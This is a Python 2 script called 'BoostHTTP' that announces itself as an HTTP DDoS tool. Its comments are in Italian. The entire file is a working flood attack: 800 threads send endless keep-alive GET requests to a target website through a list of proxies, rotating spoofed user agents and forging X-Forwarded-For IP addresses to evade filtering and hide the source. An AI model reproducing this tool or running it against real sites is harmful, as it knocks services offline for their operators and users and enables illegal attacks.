#!/usr/bin/env python
#coding: utf8 
##python BoostHTTP.py [WEBSITE] [LIST.TXT]

import sys
import random
import socket
import threading
import time

userAgents = ["Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36",
              "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36",
              "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",
              "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",
              "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
              "Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0",
              "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0",
              "Mozilla/5.0 (X11; OpenBSD amd64; rv:28.0) Gecko/20100101 Firefox/28.0",
              "Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101  Firefox/28.0",
              "Mozilla/5.0 (Windows NT 6.1; rv:27.3) Gecko/20130101 Firefox/27.3",
              "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0",
              "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:24.0) Gecko/20100101 Firefox/24.0",
              "Mozilla/5.0 (Windows; U; MSIE 9.0; WIndows NT 9.0; en-US))",
              "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)",
              "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/4.0; InfoPath.2; SV1; .NET CLR 2.0.50727; WOW64)",
              "Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)",
              "Opera/12.0(Windows NT 5.2;U;en)Presto/22.9.168 Version/12.00",
              "Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14",
              "Mozilla/5.0 (Windows NT 6.0; rv:2.0) Gecko/20100101 Firefox/4.0 Opera 12.14",
              "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
              "Opera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02",
              "Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00",
              "Opera/9.80 (Windows NT 5.1; U; zh-sg) Presto/2.9.181 Version/12.00",
              "Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)",
              "HTC_Touch_3G Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 7.11)",
              "Mozilla/4.0 (compatible; MSIE 7.0; Windows Phone OS 7.0; Trident/3.1; IEMobile/7.0; Nokia;N70)",
              "Mozilla/5.0 (BlackBerry; U; BlackBerry 9900; en) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.1.0.346 Mobile Safari/534.11+",
              "Mozilla/5.0 (BlackBerry; U; BlackBerry 9850; en-US) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.0.0.254 Mobile Safari/534.11+",
              "Mozilla/5.0 (BlackBerry; U; BlackBerry 9850; en-US) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.0.0.115 Mobile Safari/534.11+",
              "Mozilla/5.0 (BlackBerry; U; BlackBerry 9850; en) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.0.0.254 Mobile Safari/534.11+",
              "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7",
              "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Comodo_Dragon/4.1.1.11 Chrome/4.1.249.1042 Safari/532.5",
              "Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25",
              "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.13+ (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
              "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10",
              "Mozilla/5.0 (iPad; CPU OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko ) Version/5.1 Mobile/9B176 Safari/7534.48.3",
              "Mozilla/5.0 (Windows; U; Windows NT 6.1; tr-TR) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",]

def randomIp():
    random.seed()
    result = str(random.randint(1, 254)) + '.' + str(random.randint(1, 254)) + '.'
    result = result + str(random.randint(1, 254)) + '.' + str(random.randint(1, 254))
    return result

def randomIpList():
    random.seed()
    res = ""
    for ip in xrange(random.randint(2, 8)):
        res = res + randomIp() + ", "
    return res[0:len(res) - 2]

def randomUserAgent():
    return random.choice(userAgents)



class attacco(threading.Thread):
    def run(self):
        # il thread si prende l'ID
        current = x
        
        # se l'ID Ã¨ associabile ad un proxy, usa il proxy corrispondente
        if current < len(listaproxy):
            proxy = listaproxy[current].split(':')
        else:
            # altrimenti ne sceglie uno casuale
            proxy = random.choice(listaproxy).split(':')

        # composizione dell'header http
        useragent = "User-Agent: " + randomUserAgent() + "\r\n"
        forward = "X-Forwarded-For: " + randomIpList() + "\r\n"

        httprequest = get_host + useragent + accept + forward + connection + "\r\n"

        # questo ciclo fa aspettare che tutti i threads siano startati prima di cominciare
        while nload:
            time.sleep(1)
            
        # ciclo infinito dell'attacco
        while 1:
            # try perchÃ© non vogliamo che un errore ci fermi il thread
            try:
                # dichiarazione del socket
                a = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                
                # connessione al proxy
                a.connect((proxy[0], int(proxy[1])))
                
                # invio della richiesta http
                a.send(httprequest)
                
                # dopo aver inviato la prima richiesta http con successo
                # c'Ã¨ la possibilitÃ  che se ne possano inviare altre
                # sulla stessa connessione grazie alla
                # connessione keep-alive. visto che non c'Ã¨ la certezza
                # Ã¨ meglio metterlo in un try tutto suo
                try:
                    # invia la richiesta al massimo per altre 3 volte
                    # si Ã¨ visto che Ã¨ una scelta abbastanza ottimizzata
                    for i in xrange(3):
                        a.send(httprequest) 
                except:
                    # variabile al momento inutile, tanto per fargli fare
                    # qualcosa dentro l'except, probabilmente in futuro servirÃ 
                    tts = 1

                    
            except:
                # nel caso in cui durante la prima richiesta http avvenga un errore
                # c'Ã¨ la possibilitÃ  che il proxy non funzioni correttamente
                # quindi si provvede a cambiare proxy
                proxy = random.choice(listaproxy).split(':')



# grafica varia
print("          .----.BoosTHTTPv3.0 iPerFul DDoS for HTTP WebSite.----.")
print("                 .----.Creator: TheRunixx & Huggye.----.")

# input del sito
url = sys.argv[1]
host_url = url.replace("http://", "").replace("https://", "").split('/')[0]

# qui viene caricata la lista proxy dal file proxy.txt
in_file = open(sys.argv[2],"r")
proxyf = in_file.read()
in_file.close()

# grazie al caro split() ora la lista Ã¨ una lista :D
listaproxy = proxyf.split('\n')

# input del numero di threads
thread = 800


# dichiarazione di alcuni pezzi dell'header
get_host = "GET " + url + " HTTP/1.1\r\nHost: " + host_url + "\r\n"
accept = "Accept-Encoding: gzip, deflate\r\n"

# con "Connection: Keep-Alive, ecc..." Ã¨ possibile, anche se non dovrebbe esserlo, inviare
# ai proxy piÃ¹ richieste http usando la stessa connessione
connection = "Connection: Keep-Alive, Persist\r\nProxy-Connection: keep-alive\r\n"


# nload (not loaded) Ã¨ 1 quando i threads non sono ancora stati tutti avviati
# e diventa 0 quando il ciclo di avvio dei threads Ã¨ finito
nload = 1

# x serve a dare "l'id" del thread
x = 0

# ciclo di avvio dei threads
for x in xrange(thread):
    attacco().start()
    time.sleep(0.000)
    print "Thread " + str(x) + " started!"
    
print "The attack is running..."
# nload diventa 0 e i thread iniziano a lavorare
nload = 0

#ciclo nabbo in fondo
while not nload:
    time.sleep(1)

